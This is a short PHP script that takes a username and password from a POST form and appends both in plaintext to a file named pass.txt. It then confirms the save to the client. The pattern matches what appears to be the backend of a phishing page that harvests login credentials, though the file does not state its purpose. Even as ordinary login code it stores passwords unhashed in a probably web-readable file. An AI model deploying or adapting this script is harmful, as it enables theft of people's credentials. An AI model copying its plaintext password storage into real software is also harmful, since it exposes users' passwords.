<?php
// Check if the request method is POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get the form data
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    // Validate data
    if (!empty($username) && !empty($password)) {
        // Save data to pass.txt file
        $data = "Username: $username\nPassword: $password\n";
        file_put_contents('pass.txt', $data, FILE_APPEND);

        // Send response back to client
        echo 'Data saved successfully.';
    } else {
        // Send error response if data is empty
        http_response_code(400);
        echo 'Error: Username or password is empty.';
    }
} else {
    // Send error response if request method is not POST
    http_response_code(405);
    echo 'Error: Method not allowed.';
}
?>
